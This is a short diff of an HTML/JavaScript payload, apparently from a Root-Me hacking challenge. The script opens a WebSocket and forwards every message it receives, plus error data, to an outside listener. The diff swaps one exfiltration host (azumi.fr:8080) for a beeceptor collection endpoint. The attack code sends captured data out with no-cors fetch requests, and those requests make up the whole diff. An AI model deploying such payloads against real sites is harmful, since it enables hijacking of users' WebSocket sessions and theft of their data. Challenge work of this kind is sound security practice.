@@ -5,9 +5,9 @@
     ws.send("READY");
   };
   ws.onmessage = function(event) {
-    fetch('http://azumi.fr:8080/'+event.data, {mode: 'no-cors'});
+    fetch('https://rootme.free.beeceptor.com/', {method: 'POST', mode: 'no-cors', body: event.data});
   };
   ws.onerror = function(event) {
-    fetch('http://azumi.fr:8080/'+event.data, {mode: 'no-cors'});
+    fetch('https://rootme.free.beeceptor.com/', {method: 'POST', mode: 'no-cors', body: event.data});
   };
 </script>
